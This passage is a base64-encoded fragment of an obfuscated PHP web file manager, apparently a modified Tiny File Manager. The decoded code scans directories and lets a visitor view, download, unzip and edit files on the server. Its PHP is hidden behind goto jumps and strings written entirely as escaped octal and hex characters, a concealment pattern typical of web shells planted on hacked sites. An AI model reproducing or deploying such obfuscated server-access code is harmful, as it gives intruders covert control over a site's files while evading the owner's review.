bmpzLmNsb3VkZmxhcmUuY29tL2FqYXgvbGlicy9kcm9wem9uZS81LjUuMS9taW4vZHJvcHpvbmUubWluLmpzIj48L3NjcmlwdD4KICAgIDxzY3JpcHQ+CiAgICAgICAgRHJvcHpvbmUub3B0aW9ucy5maWxlVXBsb2FkZXIgPSB7CiAgICAgICAgICAgIHRpbWVvdXQ6IDEyMDAwMCwKICAgICAgICAgICAgbWF4RmlsZXNpemU6IDw/cGhwICBlY2hvIE1BWF9VUExPQURfU0laRTsgPz4KLAogICAgICAgICAgICBhY2NlcHRlZEZpbGVzIDogIjw/cGhwICBlY2hvIGdldFVwbG9hZEV4dCgpOyA/PgoiLAogICAgICAgICAgICBpbml0OiBmdW5jdGlvbiAoKSB7CiAgICAgICAgICAgICAgICB0aGlzLm9uKCJzZW5kaW5nIiwgZnVuY3Rpb24gKGZpbGUsIHhociwgZm9ybURhdGEpIHsKICAgICAgICAgICAgICAgICAgICBsZXQgX3BhdGggPSAoZmlsZS5mdWxsUGF0aCkgPyBmaWxlLmZ1bGxQYXRoIDogZmlsZS5uYW1lOwogICAgICAgICAgICAgICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJmdWxscGF0aCIpLnZhbHVlID0gX3BhdGg7CiAgICAgICAgICAgICAgICAgICAgeGhyLm9udGltZW91dCA9IChmdW5jdGlvbigpIHsKICAgICAgICAgICAgICAgICAgICAgICAgdG9hc3QoJ0Vycm9yOiBTZXJ2ZXIgVGltZW91dCcpOwogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgfSkub24oInN1Y2Nlc3MiLCBmdW5jdGlvbiAocmVzKSB7CiAgICAgICAgICAgICAgICAgICAgbGV0IF9yZXNwb25zZSA9IEpTT04ucGFyc2UocmVzLnhoci5yZXNwb25zZSk7CiAgICAgICAgICAgICAgICAgICAgaWYoX3Jlc3BvbnNlLnN0YXR1cyA9PSAiZXJyb3IiKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIHRvYXN0KF9yZXNwb25zZS5pbmZvKTsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9KS5vbigiZXJyb3IiLCBmdW5jdGlvbihmaWxlLCByZXNwb25zZSkgewogICAgICAgICAgICAgICAgICAgIHRvYXN0KHJlc3BvbnNlKTsKICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgPC9zY3JpcHQ+CiAgICA8P3BocCAgZm1fc2hvd19mb290ZXIoKTsgZGllOyB9IGdvdG8gSFhxTk47IGpvNG81OiBmdW5jdGlvbiBzY2FuKCRkaXIsICRmaWx0ZXIgPSAnJykgeyAkcGF0aCA9IEZNX1JPT1RfUEFUSCAuICJcNTciIC4gJGRpcjsgaWYgKCRkaXIpIHsgJGl0ZSA9IG5ldyBSZWN1cnNpdmVJdGVyYXRvckl0ZXJhdG9yKG5ldyBSZWN1cnNpdmVEaXJlY3RvcnlJdGVyYXRvcigkcGF0aCkpOyAkcmlpID0gbmV3IFJlZ2V4SXRlcmF0b3IoJGl0ZSwgIlw1N1x4MjgiIC4gJGZpbHRlciAuICJceDI5XDU3XDE1MSIpOyAkZmlsZXMgPSBhcnJheSgpOyBmb3JlYWNoICgkcmlpIGFzICRmaWxlKSB7IGlmICghJGZpbGUtPmlzRGlyKCkpIHsgJGZpbGVOYW1lID0gJGZpbGUtPmdldEZpbGVuYW1lKCk7ICRsb2NhdGlvbiA9IHN0cl9yZXBsYWNlKEZNX1JPT1RfUEFUSCwgJycsICRmaWxlLT5nZXRQYXRoKCkpOyAkZmlsZXNbXSA9IGFycmF5KCJceDZlXDE0MVx4NmRceDY1IiA9PiAkZmlsZU5hbWUsICJceDc0XDE3MVwxNjBceDY1IiA9PiAiXHg2Nlx4NjlceDZjXDE0NSIsICJcMTYwXHg2MVx4NzRcMTUwIiA9PiAkbG9jYXRpb24pOyB9IH0gcmV0dXJuICRmaWxlczsgfSB9IGdvdG8gWENWUVE7IFd5NmdoOiBpZiAoaXNzZXQoJF9HRVRbIlx4NzZcMTUxXHg2NVwxNjciXSkpIHsgJGZpbGUgPSAkX0dFVFsiXHg3Nlx4NjlceDY1XHg3NyJdOyAkcXVpY2tWaWV3ID0gaXNzZXQoJF9HRVRbIlwxNjFceDc1XHg2OVwxNDNcMTUzXHg1Nlx4NjlceDY1XHg3NyJdKSAmJiAkX0dFVFsiXHg3MVx4NzVcMTUxXHg2M1x4NmJceDU2XDE1MVwxNDVcMTY3Il0gPT0gMSA/IHRydWUgOiBmYWxzZTsgJGZpbGUgPSBmbV9jbGVhbl9wYXRoKCRmaWxlLCBmYWxzZSk7ICRmaWxlID0gc3RyX3JlcGxhY2UoIlx4MmYiLCAnJywgJGZpbGUpOyBpZiAoJGZpbGUgPT0gJycgfHwgIWlzX2ZpbGUoJHBhdGggLiAiXHgyZiIgLiAkZmlsZSkgfHwgaW5fYXJyYXkoJGZpbGUsICRHTE9CQUxTWyJcMTQ1XDE3MFwxNDNceDZjXHg3NVwxNDRcMTQ1XDEzN1x4NjlcMTY0XHg2NVwxNTVcMTYzIl0pKSB7IGZtX3NldF9tc2cobG5nKCJcMTA2XDE1MVx4NmNcMTQ1XHgyMFwxNTZcMTU3XHg3NFw0MFwxNDZcMTU3XHg3NVwxNTZcMTQ0IiksICJceDY1XHg3MlwxNjJceDZmXDE2MiIpOyBmbV9yZWRpcmVjdChGTV9TRUxGX1VSTCAuICJcNzdcMTYwXHgzZCIgLiB1cmxlbmNvZGUoRk1fUEFUSCkpOyB9IGlmICghJHF1aWNrVmlldykgeyBmbV9zaG93X2hlYWRlcigpOyBmbV9zaG93X25hdl9wYXRoKEZNX1BBVEgpOyB9ICRmaWxlX3VybCA9IEZNX1JPT1RfVVJMIC4gZm1fY29udmVydF93aW4oKEZNX1BBVEggIT0gJycgPyAiXHgyZiIgLiBGTV9QQVRIIDogJycpIC4gIlw1NyIgLiAkZmlsZSk7ICRmaWxlX3BhdGggPSAkcGF0aCAuICJcNTciIC4gJGZpbGU7ICRleHQgPSBzdHJ0b2xvd2VyKHBhdGhpbmZvKCRmaWxlX3BhdGgsIFBBVEhJTkZPX0VYVEVOU0lPTikpOyAkbWltZV90eXBlID0gZm1fZ2V0X21pbWVfdHlwZSgkZmlsZV9wYXRoKTsgJGZpbGVzaXplX3JhdyA9IGZtX2dldF9zaXplKCRmaWxlX3BhdGgpOyAkZmlsZXNpemUgPSBmbV9nZXRfZmlsZXNpemUoJGZpbGVzaXplX3Jhdyk7ICRpc196aXAgPSBmYWxzZTsgJGlzX2d6aXAgPSBmYWxzZTsgJGlzX2ltYWdlID0gZmFsc2U7ICRpc19hdWRpbyA9IGZhbHNlOyAkaXNfdmlkZW8gPSBmYWxzZTsgJGlzX3RleHQgPSBmYWxzZTsgJGlzX29ubGluZVZpZXdlciA9IGZhbHNlOyAkdmlld190aXRsZSA9ICJceDQ2XHg2OVwxNTRceDY1IjsgJGZpbGVuYW1lcyA9IGZhbHNlOyAkY29udGVudCA9ICcnOyAkb25saW5lX3ZpZXdlciA9IHN0cnRvbG93ZXIoRk1fRE9DX1ZJRVdFUik7IGlmICgkb25saW5lX3ZpZXdlciAmJiAkb25saW5lX3ZpZXdlciAhPT0gIlx4NjZcMTQxXHg2Y1x4NzNcMTQ1IiAmJiBpbl9hcnJheSgkZXh0LCBmbV9nZXRfb25saW5lVmlld2VyX2V4dHMoKSkpIHsgJGlzX29ubGluZVZpZXdlciA9IHRydWU7IH0gZWxzZWlmICgkZXh0ID09ICJceDdhXDE1MVx4NzAiIHx8ICRleHQgPT0gIlx4NzRcMTQxXDE2MiIpIHsgJGlzX3ppcCA9IHRydWU7ICR2aWV3X3RpdGxlID0gIlx4NDFcMTYyXHg2M1x4NjhceDY5XDE2NlwxNDUiOyAkZmlsZW5hbWVzID0gZm1fZ2V0X3ppZl9pbmZvKCRmaWxlX3BhdGgsICRleHQpOyB9IGVsc2VpZiAoaW5fYXJyYXkoJGV4dCwgZm1fZ2V0X2ltYWdlX2V4dHMoKSkpIHsgJGlzX2ltYWdlID0gdHJ1ZTsgJHZpZXdfdGl0bGUgPSAiXHg0OVx4NmRcMTQxXDE0N1x4NjUiOyB9IGVsc2VpZiAoaW5fYXJyYXkoJGV4dCwgZm1fZ2V0X2F1ZGlvX2V4dHMoKSkpIHsgJGlzX2F1ZGlvID0gdHJ1ZTsgJHZpZXdfdGl0bGUgPSAiXDEwMVwxNjVceDY0XHg2OVwxNTciOyB9IGVsc2VpZiAoaW5fYXJyYXkoJGV4dCwgZm1fZ2V0X3ZpZGVvX2V4dHMoKSkpIHsgJGlzX3ZpZGVvID0gdHJ1ZTsgJHZpZXdfdGl0bGUgPSAiXHg1Nlx4NjlceDY0XDE0NVwxNTciOyB9IGVsc2VpZiAoaW5fYXJyYXkoJGV4dCwgZm1fZ2V0X3RleHRfZXh0cygpKSB8fCBzdWJzdHIoJG1pbWVfdHlwZSwgMCwgNCkgPT0gIlwxNjRcMTQ1XHg3OFwxNjQiIHx8IGluX2FycmF5KCRtaW1lX3R5cGUsIGZtX2dldF90ZXh0X21pbWVzKCkpKSB7ICRpc190ZXh0ID0gdHJ1ZTsgJGNvbnRlbnQgPSBmaWxlX2dldF9jb250ZW50cygkZmlsZV9wYXRoKTsgfSA/PgogICAgPGRpdiBjbGFzcz0icm93Ij4KICAgICAgICA8ZGl2IGNsYXNzPSJjb2wtMTIiPgogICAgICAgICAgICA8P3BocCAgaWYgKCEkcXVpY2tWaWV3KSB7ID8+CiAgICAgICAgICAgICAgICA8cCBjbGFzcz0iYnJlYWstd29yZCI+PGI+PD9waHAgIGVjaG8gJHZpZXdfdGl0bGU7ID8+CiAiPD9waHAgIGVjaG8gZm1fZW5jKGZtX2NvbnZlcnRfd2luKCRmaWxlKSk7ID8+CiI8L2I+PC9wPgogICAgICAgICAgICAgICAgPHAgY2xhc3M9ImJyZWFrLXdvcmQiPgogICAgICAgICAgICAgICAgICAgIEZ1bGwgcGF0aDogPD9waHAgIGVjaG8gZm1fZW5jKGZtX2NvbnZlcnRfd2luKCRmaWxlX3BhdGgpKTsgPz4KPGJyPgogICAgICAgICAgICAgICAgICAgIEZpbGUgc2l6ZTogPD9waHAgIGVjaG8gJGZpbGVzaXplX3JhdyA8PSAxMDAwID8gInskZmlsZXNpemVfcmF3fVw0MFwxNDJceDc5XDE2NFx4NjVceDczIiA6ICRmaWxlc2l6ZTsgPz4KPGJyPgogICAgICAgICAgICAgICAgICAgIE1JTUUtdHlwZTogPD9waHAgIGVjaG8gJG1pbWVfdHlwZTsgPz4KPGJyPgogICAgICAgICAgICAgICAgICAgIDw/cGhwICBpZiAoKCRpc196aXAgfHwgJGlzX2d6aXApICYmICRmaWxlbmFtZXMgIT09IGZhbHNlKSB7ICR0b3RhbF9maWxlcyA9IDA7ICR0b3RhbF9jb21wID0gMDsgJHRvdGFsX3VuY29tcCA9IDA7IGZvcmVhY2ggKCRmaWxlbmFtZXMgYXMgJGZuKSB7IGlmICghJGZuWyJcMTQ2XHg2ZlwxNTRceDY0XDE0NVx4NzIiXSkgeyAkdG90YWxfZmlsZXMrKzsgfSAkdG90YWxfY29tcCArPSAkZm5bIlx4NjNcMTU3XDE1NVwxNjBcMTYyXHg2NVwxNjNceDczXHg2NVx4NjRceDVmXDE2M1x4NjlcMTcyXDE0NSJdOyAkdG90YWxfdW5jb21wICs9ICRmblsiXHg2NlwxNTFcMTU0XHg2NVwxNjNceDY5XDE3Mlx4NjUiXTsgfSA/PgogICAgICAgICAgICAgICAgICAgICAgICBGaWxlcyBpbiBhcmNoaXZlOiA8P3BocCAgZWNobyAkdG90YWxfZmlsZXM7ID8+Cjxicj4KICAgICAgICAgICAgICAgICAgICAgICAgVG90YWwgc2l6ZTogPD9waHAgIGVjaG8gZm1fZ2V0X2ZpbGVzaXplKCR0b3RhbF91bmNvbXApOyA/Pgo8YnI+CiAgICAgICAgICAgICAgICAgICAgICAgIFNpemUgaW4gYXJjaGl2ZTogPD9waHAgIGVjaG8gZm1fZ2V0X2ZpbGVzaXplKCR0b3RhbF9jb21wKTsgPz4KPGJyPgogICAgICAgICAgICAgICAgICAgICAgICBDb21wcmVzc2lvbjogPD9waHAgIGVjaG8gcm91bmQoJHRvdGFsX2NvbXAgLyAkdG90YWxfdW5jb21wICogMTAwKTsgPz4KJTxicj4KICAgICAgICAgICAgICAgICAgICAgICAgPD9waHAgIH0gaWYgKCRpc19pbWFnZSkgeyAkaW1hZ2Vfc2l6ZSA9IGdldGltYWdlc2l6ZSgkZmlsZV9wYXRoKTsgZWNobyAiXHg0OVx4NmRceDYxXDE0N1wxNDVcNDBceDczXHg2OVwxNzJcMTQ1XHg3M1w3Mlw0MCIgLiAoaXNzZXQoJGltYWdlX3NpemVbMF0pID8gJGltYWdlX3NpemVbMF0gOiAiXHgzMCIpIC4gIlx4MjBcMTcwXHgyMCIgLiAoaXNzZXQoJGltYWdlX3NpemVbMV0pID8gJGltYWdlX3NpemVbMV0gOiAiXDYwIikgLiAiXDc0XHg2MlwxNjJcNzYiOyB9IGlmICgkaXNfdGV4dCkgeyAkaXNfdXRmOCA9IGZtX2lzX3V0ZjgoJGNvbnRlbnQpOyBpZiAoZnVuY3Rpb25fZXhpc3RzKCJceDY5XDE0M1x4NmZcMTU2XDE2NiIpKSB7IGlmICghJGlzX3V0ZjgpIHsgJGNvbnRlbnQgPSBpY29udihGTV9JQ09OVl9JTlBVVF9FTkMsICJcMTI1XDEyNFwxMDZcNTVceDM4XDU3XHgyZlx4NDlcMTA3XDExNlwxMTdcMTIyXHg0NSIsICRjb250ZW50KTsgfSB9IGVjaG8gIlx4NDNceDY4XHg2MVx4NzJcMTYzXDE0NVx4NzRcNzJceDIwIiAuICgkaXNfdXRmOCA/ICJceDc1XDE2NFwxNDZcNTVceDM4IiA6ICJceDM4XDQwXHg2Mlx4NjlceDc0IikgLiAiXDc0XDE0MlwxNjJceDNlIjsgfSA/PgogICAgICAgICAgICAgICAgPC9wPgogICAgICAgICAgICAgICAgPHA+CiAgICAgICAgICAgICAgICAgICAgPGI+PGEgaHJlZj0iP3A9PD9waHAgIGVjaG8gdXJsZW5jb2RlKEZNX1BBVEgpOyA/PgomYW1wO2RsPTw/cGhwICBlY2hvIHVybGVuY29kZSgkZmlsZSk7ID8+CiI+PGkgY2xhc3M9ImZhIGZhLWNsb3VkLWRvd25sb2FkIj48L2k+IDw/cGhwICBlY2hvIGxuZygiXDEwNFwxNTdceDc3XHg2ZVx4NmNcMTU3XHg2MVwxNDQiKTsgPz4KPC9hPjwvYj4gJm5ic3A7CiAgICAgICAgICAgICAgICAgICAgPGI+PGEgaHJlZj0iPD9waHAgIGVjaG8gZm1fZW5jKCRmaWxlX3VybCk7ID8+CiIgdGFyZ2V0PSJfYmxhbmsiPjxpIGNsYXNzPSJmYSBmYS1leHRlcm5hbC1saW5rLXNxdWFyZSI+PC9pPiA8P3BocCAgZWNobyBsbmcoIlwxMTdcMTYwXDE0NVwxNTYiKTsgPz4KPC9hPjwvYj4KICAgICAgICAgICAgICAgICAgICAmbmJzcDsKICAgICAgICAgICAgICAgICAgICA8P3BocCAgaWYgKCFGTV9SRUFET05MWSAmJiAoJGlzX3ppcCB8fCAkaXNfZ3ppcCkgJiYgJGZpbGVuYW1lcyAhPT0gZmFsc2UpIHsgJHppcF9uYW1lID0gcGF0aGluZm8oJGZpbGVfcGF0aCwgUEFUSElORk9fRklMRU5BTUUpOyA/PgogICAgICAgICAgICAgICAgICAgICAgICA8Yj48YSBocmVmPSI/cD08P3BocCAgZWNobyB1cmxlbmNvZGUoRk1fUEFUSCk7ID8+CiZhbXA7dW56aXA9PD9waHAgIGVjaG8gdXJsZW5jb2RlKCRmaWxlKTsgPz4KIj48aSBjbGFzcz0iZmEgZmEtY2hlY2stY2lyY2xlIj48L2k+IDw/cGhwICBlY2hvIGxuZygiXHg1NVwxNTZceDVhXHg2OVx4NzAiKTsgPz4KPC9hPjwvYj4gJm5ic3A7CiAgICAgICAgICAgICAgICAgICAgICAgIDxiPjxhIGhyZWY9Ij9wPTw/cGhwICBlY2hvIHVybGVuY29kZShGTV9QQVRIKTsgPz4KJmFtcDt1bnppcD08P3BocCAgZWNobyB1cmxlbmNvZGUoJGZpbGUpOyA/PgomYW1wO3RvZm9sZGVyPTEiIHRpdGxlPSJVblppcCB0byA8P3BocCAgZWNobyBmbV9lbmMoJHppcF9uYW1lKTsgPz4KIj48aSBjbGFzcz0iZmEgZmEtY2hlY2stY2lyY2xlIj48L2k+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPD9waHAgIGVjaG8gbG5nKCJcMTI1XDE1Nlx4NWFcMTUxXHg3MFx4NTRcMTU3XDEwNlwxNTdcMTU0XDE0NFwxNDVceDcyIik7ID8+CjwvYT48L2I+ICZuYnNwOwogICAgICAgICAgICAgICAgICAgICAgICA8P3BocCAgfSBpZiAoJGlzX3RleHQgJiYgIUZNX1JFQURPTkxZKSB7ID8+CiAgICAgICAgICAgICAgICAgICAgICAgIDxiPjxhIGhyZWY9Ij9wPTw/cGhwICBlY2hvIHVybGVuY29kZSh0cmltKEZNX1BBVEgpKTsgPz4KJmFtcDtlZGl0PTw/cGhwICBlY2hvIHVybGVuY29kZSgkZmlsZSk7ID8+CiIgY2xhc3M9ImVkaXQtZmlsZSI+PGkgY2xhc3M9ImZhIGZhLXBlbmNpbC1zcXVhcmUiPjwvaT4gPD9waHAgIGVjaG8gbG5nKCJcMTA1XDE0NFx4NjlcMTY0Iik7ID8+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2E+PC9iPiAmbmJzcDsKICAgICAgICAgICAgICAgICAgICAgICAgPGI+PGEgaHJlZj0iP3A9PD9waHAgIGVjaG8gdXJsZW5jb2RlKHRyaW0oRk1fUEFUSCkpOyA/PgomYW1wO2VkaXQ9PD9waHAgIGVjaG8gdXJsZW5jb2RlKCRmaWxlKTsgPz4KJmVudj1hY2UiCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNsYXNzPSJlZGl0LWZpbGUiPjxpIGNsYXNzPSJmYSBmYS1wZW5jaWwtc3F1YXJlLW8iPjwvaT4gPD9waHAgIGVjaG8gbG5nKCJceDQxXHg2NFx4NzZceDYxXHg2ZVx4NjNcMTQ1XDE0NFwxMDVceDY0XHg2OVwxNjRcMTU3XHg3MiIpOyA/PgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9hPjwvYj4gJm5ic3A7CiAgICAgICAgICAgICAgICAgICAgPD9waHAgIH0gPz4KICAgICAgICAgICAgICAgICAgICA8Yj48YSBocmVmPSI/cD08P3BocCAgZWNobyB1cmxlbmNvZGUoRk1fUEFUSCk7ID8+CiI+PGkgY2xhc3M9ImZhIGZhLWNoZXZyb24tY2lyY2xlLWxlZnQgZ28tYmFjayI+PC9pPiA8P3BocCAgZWNobyBsbmcoIlwxMDJceDYxXDE0M1wxNTMiKTsgPz4KPC9hPjwvYj4KICAgICAgICAgICAgICAgIDwvcD4KICAgICAgICAgICAgICAgIDw/cGhwICB9IGlmICgkaXNfb25saW5lVmlld2VyKSB7IGlmICgkb25saW5lX3ZpZXdlciA9PSAiXHg2N1wxNTdceDZmXDE0N1x4NmNceDY1IikgeyBlY2hvICJceDNjXHg2OVx4NjZcMTYyXDE0MVx4NmRceDY1XDQwXHg3M1x4NzJceDYzXDc1XHgyMlx4NjhceDc0XHg3NFx4NzBceDczXDcyXDU3XHgyZlx4NjRcMTU3XHg2M1wxNjNceDJlXHg2N1wxNTdceDZmXHg2N1x4NmNceDY1XDU2XHg2M1x4NmZcMTU1XDU3XHg3NlwxNTFceDY1XDE2N1wxNDVcMTYyXDc3XHg2NVwxNTVcMTQyXDE0NVx4NjRceDY0XHg2NVx4NjRcNzVceDc0XDE2MlwxNjVceDY1XDQ2XHg2OFx4NmNcNzVcMTQ1XHg2ZVw0Nlx4NzVceDcyXDE1NFx4M2QiIC4gZm1fZW5jKCRmaWxlX3VybCkgLiAiXHgyMlx4MjBcMTQ2XHg3MlwxNDFceDZkXHg2NVwxNDJceDZmXHg3MlwxNDRceDY1XDE2Mlw3NVw0Mlx4NmVceDZmXDQyXDQwXDE2M1wxNjRcMTcxXDE1NFwxNDVceDNkXDQyXDE2N1x4NjlcMTQ0XDE2NFx4NjhcNzJcNjFceDMwXDYwXHgyNVx4M2JcMTU1XHg2OVx4NmVcNTVcMTUwXHg2NVx4NjlceDY3XDE1MFwxNjRceDNhXHgzNFw2Nlw2MFwxNjBceDc4XDQyXDc2XDc0XDU3XDE1MVwxNDZceDcyXHg2MVx4NmRceDY1XHgzZSI7IH0gZWxzZSB7IGlmICgkb25saW5lX3ZpZXdlciA9PSAiXHg2ZFx4NjlcMTQzXHg3Mlx4NmZceDczXDE1N1x4NjZcMTY0IikgeyBlY2hvICJcNzRceDY5XHg2NlwxNjJcMTQxXDE1NVwxNDVceDIwXHg3M1x4NzJceDYzXDc1XHgyMlx4NjhceDc0XHg3NFwxNjBceDczXDcyXDU3XDU3XDE2NlwxNTFcMTQ1XHg3N1x4MmVceDZmXHg2Nlx4NjZcMTUxXDE0M1x4NjVceDYxXDE2MFx4NzBcMTYzXDU2XHg2Y1x4NjlceDc2XHg2NVw1Nlx4NjNcMTU3XHg2ZFx4MmZcMTU3XHg3MFw1N1x4NjVcMTU1XDE0MlwxNDVceDY0XHgyZVwxNDFcMTYzXDE2MFx4NzhcNzdceDczXHg3Mlx4NjNceDNkIiAuIGZtX2VuYygkZmlsZV91cmwpIC4gIlx4MjJceDIwXDE0Nlx4NzJceDYxXHg2ZFx4NjVcMTQyXDE1N1wxNjJcMTQ0XHg2NVx4NzJceDNkXDQyXDE1NlwxNTdcNDJcNDBcMTYzXHg3NFx4NzlcMTU0XHg2NVx4M2RcNDJceDc3XHg2OVwxNDRcMTY0XDE1MFw3Mlx4MzFcNjBceDMwXDQ1XDczXHg2ZFwxNTFcMTU2XHgyZFwxNTBcMTQ1XDE1MVx4NjdceDY4XHg3NFw3Mlx4MzRceDM2XDYwXDE2MFwxNzBceDIyXHgzZVx4M2NcNTdcMTUxXHg2NlwxNjJceDYxXDE1NVwxNDVcNzYiOyB9IH0gfSBlbHNlaWYgKCRpc196aXApIHsgaWYgKCRmaWxlbmFtZXMgIT09IGZhbHNlKSB7IGVjaG8gIlw3NFx4NjNcMTU3XDE0NFwxNDVceDIwXHg2M1wxNTRceDYxXHg3M1x4NzNceDNkXHgyMlwxNTVcMTQxXHg3OFx4NjhceDY1XHg2OVwxNDdcMTUwXHg3NFw0Mlx4M2UiOyBmb3JlYWNoICgkZmlsZW5hbWVzIGFzICRmbikgeyBpZiAoJGZuWyJcMTQ2XHg2Zlx4NmNcMTQ0XDE0NVx4NzIiXSkgeyBlY2hvICJcNzRceDYyXDc2IiAuIGZtX2VuYygkZm5bIlwxNTZceDYxXHg2ZFx4NjUiXSkgLiAiXHgzY1w1N1wxNDJceDNlXHgzY1x4NjJceDcyXHgzZSI7IH0gZWxzZSB7IGVjaG8gJGZuWyJceDZlXDE0MVx4NmRceDY1Il0gLiAiXDQwXHgyOCIgLiBmbV9nZXRfZmlsZXNpemUoJGZuWyJceDY2XHg2OVx4NmNceDY1XDE2M1wxNTFcMTcyXDE0NSJdKSAuICJceDI5XHgzY1wxNDJcMTYyXHgzZSI7IH0gfSBlY2hvICJceDNjXHgyZlx4NjNceDZmXHg2NFx4NjVceDNlIjsgfSBlbHNlIHsgZWNobyAiXHgzY1wxNjBcNzYiIC4gbG5nKCJcMTA1XDE2Mlx4NzJcMTU3XDE2Mlx4MjBceDc3XDE1MFwxNTFcMTU0XDE0NVw0MFwxNDZceDY1XHg3NFwxNDNceDY4XDE1MVx4NmVceDY3XHgyMFwxNDFcMTYyXHg2M1wxNTBceDY5XDE2Nlx4NjVceDIwXDE1MVwxNTZcMTQ2XDE1NyIpIC4gIlw3NFx4MmZcMTYwXDc2IjsgfSB9IGVsc2VpZiAoJGlzX2ltYWdlKSB7IGlmIChpbl9hcnJheSgkZXh0LCBhcnJheSgiXHg2N1wxNTFceDY2IiwgIlx4NmFcMTYwXHg2NyIsICJceDZhXHg3MFx4NjVceDY3IiwgIlwxNjBceDZlXHg2NyIsICJcMTQyXHg2ZFx4NzAiLCAiXHg2OVx4NjNcMTU3IiwgIlwxNjNceDc2XDE0NyIsICJcMTY3XHg2NVx4NjJceDcwIiwgIlwxNDFcMTY2XHg2OVx4NjYiKSkpIHsgZWNobyAiXDc0XDE2MFx4M2VcNzRceDY5XHg2ZFx4NjdcNDBceDczXDE2MlwxNDNcNzVcNDIiIC4gZm1fZW5jKCRmaWxlX3VybCkgLiAiXHgyMlx4MjBcMTQxXDE1NFx4NzRcNzVcNDJcNDJceDIwXHg2M1wxNTRcMTQxXHg3M1x4NzNceDNkXDQyXDE2MFwxNjJcMTQ1XDE2Nlx4NjlceDY1XHg3N1x4MmRceDY5XHg2ZFx4NjdceDIyXHgzZVw3NFw1N1wxNjBceDNlIjsgfSB9IGVsc2VpZiAoJGlzX2F1ZGlvKSB7IGVjaG8gIlx4M2NcMTYwXHgzZVw3NFwxNDFcMTY1XHg2NFwxNTFceDZmXHgyMFwxNjNceDcyXHg2M1w3NVw0MiIgLiBmbV9lbmMoJGZpbGVfdXJsKSAuICJceDIyXHgyMFwxNDNceDZmXDE1NlwxNjRceDcyXDE1N1x4NmNcMTYzXDQwXDE2MFwxNjJceDY1XDE1NFx4NmZceDYxXHg2NFw3NVw0MlwxNTVceDY1XDE2NFx4NjFceDY0XHg2MVwxNjRceDYxXHgyMlx4M2VcNzRcNTdcMTQxXDE2NVx4NjRcMTUxXDE1N1x4M2VceDNjXDU3XDE2MFx4M2UiOyB9IGVsc2VpZiAoJGlzX3ZpZGVvKSB7IGVjaG8gIlw3NFwxNDRcMTUxXHg3Nlw0MFwxNDNceDZjXHg2MVx4NzNceDczXHgzZFw0Mlx4NzBceDcyXDE0NVwxNjZceDY5XHg2NVx4NzdcNTVceDc2XDE1MVwxNDRceDY1XDE1N1x4MjJcNzZceDNjXHg3Nlx4NjlcMTQ0XHg2NVwxNTdcNDBcMTYzXDE2Mlx4NjNcNzVcNDIiIC4gZm1fZW5jKCRmaWxlX3VybCkgLiAiXDQyXDQwXHg3N1wxNTFceDY0XHg3NFx4NjhceDNkXHgyMlx4MzZcNjRceDMwXHgyMlx4MjBceDY4XHg2NVx4NjlcMTQ3XDE1MFx4NzRceDNkXDQyXDYzXDY2XDYwXDQyXHgyMFwxNDNceDZmXDE1Nlx4NzRcMTYyXHg2ZlwxNTRcMTYzXDQwXDE2MFx4NzJcMTQ1XDE1NFwxNTdcMTQxXDE0NFx4M2RceDIyXDE1NVx4NjVcMTY0XDE0MVwxNDRceDYxXDE2NFx4NjFceDIyXHgzZVx4M2NcNTdcMTY2XHg2OVwxNDRcMTQ1XDE1N1x4M2VceDNjXHgyZlwxNDRceDY5XDE2Nlx4M2UiOyB9IGVsc2VpZiAoJGlzX3RleHQpIHsgaWYgKEZNX1VTRV9ISUdITElHSFRKUykgeyAkaGxqc19jbGFzc2VzID0gYXJyYXkoIlwxNjNcMTUwXHg3NFwxNTVcMTU0IiA9PiAiXDE3MFx4NmRceDZjIiwgIlwxNTBceDc0XHg2MVx4NjNceDYzXHg2NVwxNjNceDczIiA9PiAiXDE0MVx4NzBcMTQxXDE0M1wxNTBcMTQ1IiwgIlx4NzBcMTUwXDE2NFwxNTVceDZjIiA9PiAiXHg3MFwxNTBceDcwIiwgIlx4NmNcMTU3XDE0M1wxNTMiID0+ICJcMTUyXDE2M1wxNTdcMTU2IiwgIlwxNjNceDc2XHg2NyIgPT4gIlwxNzBcMTU1XDE1NCIpOyAkaGxqc19jbGFzcyA9IGlzc2V0KCRobGpzX2NsYXNzZXNbJGV4dF0pID8gIlx4NmNceDYxXDE1Nlx4NjdcNTUiIC4gJGhsanNfY2xhc3Nlc1skZXh0XSA6ICJceDZjXHg2MVx4NmVceDY3XHgyZCIgLiAkZXh0OyBpZiAoZW1wdHkoJGV4dCkgfHwgaW5fYXJyYXkoc3RydG9sb3dlcigkZmlsZSksIGZtX2dldF90ZXh0X25hbWVzKCkpIHx8IHByZWdfbWF0Y2goIlx4MjNceDVjXHgyZVx4NmRcMTUxXDE1NlwxMzRceDJlXHgyOFwxNDNcMTYzXHg3M1wxNzRceDZhXDE2M1w1MVx4MjRcNDNceDY5IiwgJGZpbGUpKSB7ICRobGpzX2NsYXNzID0gIlwxNTZceDZmXDE1MFwxNTFceDY3XDE1MFwxNTRcMTUxXHg2N1wxNTBcMTY0IjsgfSAkY29udGVudCA9ICJceDNjXDE2MFx4NzJceDY1XHgyMFwxNDNcMTU0XDE0MVx4NzNceDczXDc1XHgyMlwxNjdceDY5XHg3NFwxNTBceDJkXHg2OFwxNTRceDZhXHg3M1x4MjJceDNlXDc0XHg2M1wxNTdcMTQ0XHg2NVx4MjBceDYzXHg2Y1wxNDFceDczXDE2M1w3NVx4MjIiIC4gJGhsanNfY2xhc3MgLiAiXDQyXHgzZSIgLiBmbV9lbmMoJGNvbnRlbnQpIC4gIlx4M2NceDJmXDE0M1wxNTdceDY0XHg2NVx4M2VcNzRceDJmXDE2MFx4NzJceDY1XHgzZSI7IH0gZWxzZWlmIChpbl9hcnJheSgkZXh0LCBhcnJheSgiXHg3MFx4NjhcMTYwIiwgIlwxNjBcMTUwXHg3MFx4MzQiLCAiXHg3MFwxNTBceDcwXHgzNSIsICJceDcwXHg2OFwxNjRceDZkXDE1NCIsICJcMTYwXHg2OFx4NzBceDczIikpKSB7ICRjb250ZW50ID0gaGlnaGxpZ2h0X3N0cmluZygkY29udGVudCwgdHJ1ZSk7IH0gZWxz